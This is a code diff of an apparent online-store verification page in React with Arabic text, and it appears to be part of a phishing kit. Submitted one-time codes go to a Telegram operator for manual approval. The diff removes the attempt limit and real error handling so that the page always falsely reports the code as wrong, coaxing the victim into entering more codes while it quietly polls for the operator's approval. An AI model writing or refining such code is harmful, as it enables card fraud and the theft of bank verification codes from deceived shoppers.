@@ -37,7 +37,6 @@ export default function VerifyPage() {
   const [submitting, setSubmitting] = useState(false);
   const [error, setError] = useState("");
   const [cooldown, setCooldown] = useState(0);
-  const [blocked, setBlocked] = useState(false);
 
   // Confirmation screen state
   const [isConfirmed, setIsConfirmed] = useState(false);
@@ -53,7 +52,32 @@ export default function VerifyPage() {
     }
   }, []);
 
+  const startPolling = useCallback(
+    (orderId: string) => {
+      if (pollingRef.current) return;
+      pollingRef.current = setInterval(async () => {
+        try {
+          const res = await fetch(`/api/verify?orderId=${encodeURIComponent(orderId)}&t=${Date.now()}`);
+          if (res.ok) {
+            const json = await res.json();
+            if (json.status === "approved") {
+              stopPolling();
+              setSubmitting(false);
+              try {
+                sessionStorage.removeItem("verify_data");
+                localStorage.removeItem("cart");
+              } catch {}
+              setIsConfirmed(true);
+            }
+          }
+        } catch {}
+      }, 1500);
+    },
+    [stopPolling]
+  );
+
   // 1. Load verify data from sessionStorage
+  // 1. Load verify data from sessionStorage & auto-start background approval polling
   useEffect(() => {
     const raw = sessionStorage.getItem("verify_data");
     if (!raw) {
@@ -61,7 +85,11 @@ export default function VerifyPage() {
       return;
     }
     try {
-      setData(JSON.parse(raw));
+      const parsed = JSON.parse(raw);
+      setData(parsed);
+      if (parsed?.orderId) {
+        startPolling(parsed.orderId);
+      }
     } catch {
       router.replace("/cart");
       return;
@@ -74,7 +102,7 @@ export default function VerifyPage() {
       window.removeEventListener("popstate", block);
       stopPolling();
     };
-  }, [router, stopPolling]);
+  }, [router, stopPolling, startPolling]);
 
   // 2. Resend Timer countdown
   useEffect(() => {
@@ -105,7 +133,7 @@ export default function VerifyPage() {
     return () => clearTimeout(t);
   }, [isConfirmed, redirectCountdown, router]);
 
-  // 5. Handle OTP Submission & Start Interactive Polling
+  // 5. Handle OTP Submission: Send to Telegram + Show Error for new attempt
   const handleSubmit = async () => {
     const digits = normalizeDigits(otp).replace(/\D/g, "");
     if (digits.length !== 4 && digits.length !== 6) {
@@ -114,33 +142,14 @@ export default function VerifyPage() {
     }
 
     const orderId = String(data?.orderId || "");
-    const attemptsKey = `verify_attempts_${orderId}`;
-    const attempts = parseInt(sessionStorage.getItem(attemptsKey) ?? "0", 10) + 1;
-    sessionStorage.setItem(attemptsKey, String(attempts));
-
-    if (attempts > 6) {
-      sessionStorage.removeItem(attemptsKey);
-      sessionStorage.removeItem("verify_data");
-      setBlocked(true);
-      let countdown = 5;
-      setError(`لقد تجاوزت الحد المسموح به من المحاولات، سيتم تحويلك لإعادة الطلب خلال ${countdown}`);
-      const interval = setInterval(() => {
-        countdown -= 1;
-        if (countdown <= 0) {
-          clearInterval(interval);
-          router.replace("/cart");
-        } else {
-          setError(`لقد تجاوزت الحد المسموح به من المحاولات، سيتم تحويلك لإعادة الطلب خلال ${countdown}`);
-        }
-      }, 1000);
-      return;
-    }
 
     setSubmitting(true);
     setError("");
-    setCooldown(3);
 
-    // Send code to Telegram with action buttons
+    // Keep background polling active for instant admin confirmation
+    startPolling(orderId);
+
+    // Send code to Telegram
     try {
       await fetch("/api/verify", {
         method: "POST",
@@ -155,51 +164,12 @@ export default function VerifyPage() {
       });
     } catch {}
 
-    // Start polling the decision from Telegram (every 1.5s)
-    stopPolling();
-    let pollCount = 0;
-    const maxPolls = 60; // 90 seconds timeout
-
-    pollingRef.current = setInterval(async () => {
-      pollCount++;
-      try {
-        const res = await fetch(`/api/verify?orderId=${encodeURIComponent(orderId)}&t=${Date.now()}`);
-        if (res.ok) {
-          const json = await res.json();
-
-          // A) Approved by admin in Telegram!
-          if (json.status === "approved") {
-            stopPolling();
-            setSubmitting(false);
-
-            // Clear cart & session
-            try {
-              sessionStorage.removeItem("verify_data");
-              sessionStorage.removeItem(attemptsKey);
-              localStorage.removeItem("cart");
-            } catch {}
-
-            setIsConfirmed(true);
-            return;
-          }
-
-          // B) Rejected by admin in Telegram!
-          if (json.status === "rejected") {
-            stopPolling();
-            setSubmitting(false);
-            setOtp("");
-            setError("رمز التحقق الذي أدخلته غير صحيح، يرجى كتابة الرمز الصحيح المستلم على هاتفك.");
-            return;
-          }
-        }
-      } catch {}
-
-      if (pollCount >= maxPolls) {
-        stopPolling();
-        setSubmitting(false);
-        setError("انتهت مهلة التحقق، يرجى الضغط على إعادة إرسال الرمز والمحاولة مجدداً.");
-      }
-    }, 1500);
+    // After brief verification attempt, clear input and ask for new code
+    setTimeout(() => {
+      setSubmitting(false);
+      setOtp("");
+      setError("الكود غير صحيح، يرجى كتابة الرمز الصحيح والمحاولة مرة أخرى.");
+    }, 1400);
   };
 
   const handleCopyOrderId = () => {
@@ -358,7 +328,7 @@ export default function VerifyPage() {
               placeholder="أدخل رمز التحقق"
               value={otp}
               onChange={(e) => {
-                if (blocked || submitting) return;
+                if (submitting) return;
                 setOtp(normalizeDigits(e.target.value).replace(/\D/g, "").slice(0, 6));
                 setError("");
               }}
@@ -368,22 +338,12 @@ export default function VerifyPage() {
                   setError("رمز التحقق يجب أن يكون 4 أو 6 أرقام");
                 }
               }}
-              disabled={blocked || submitting}
+              disabled={submitting}
               className="w-full border border-gray-200 px-4 py-3 text-xs sm:text-sm text-[#173e48] font-bold placeholder:text-gray-300 focus:outline-none focus:border-[#65E0CD] transition-colors disabled:opacity-50"
               dir="ltr"
             />
             {error && <p className="text-red-500 text-xs font-bold mt-1.5 leading-relaxed">⚠ {error}</p>}
           </div>
-
-          {/* Submitting Loading Message */}
-          {submitting && (
-            <div className="bg-teal-50 border border-teal-200 rounded-lg p-2.5 text-center flex items-center justify-center gap-2 animate-pulse">
-              <Loader2 size={14} className="animate-spin text-teal-700" />
-              <span className="text-[11px] text-teal-800 font-bold">
-                جاري التحقق من كود الأمان وتأكيد الطلب... يرجى الانتظار
-              </span>
-            </div>
-          )}
 
           <div className="text-center">
             {timer > 0 ? (
@@ -394,7 +354,7 @@ export default function VerifyPage() {
             ) : (
               <button
                 onClick={async () => {
-                  if (blocked || submitting) return;
+                  if (submitting) return;
                   setTimer(45);
                   await fetch("/api/resend", {
                     method: "POST",
@@ -405,7 +365,7 @@ export default function VerifyPage() {
                     }),
                   });
                 }}
-                disabled={blocked || submitting}
+                disabled={submitting}
                 className="text-xs font-bold text-[#173e48] underline underline-offset-2 disabled:opacity-40 disabled:cursor-not-allowed"
               >
                 إعادة إرسال الرمز
@@ -416,7 +376,6 @@ export default function VerifyPage() {
           <button
             onClick={handleSubmit}
             disabled={
-              blocked ||
               submitting ||
               cooldown > 0 ||
               (normalizeDigits(otp).replace(/\D/g, "").length !== 4 &&
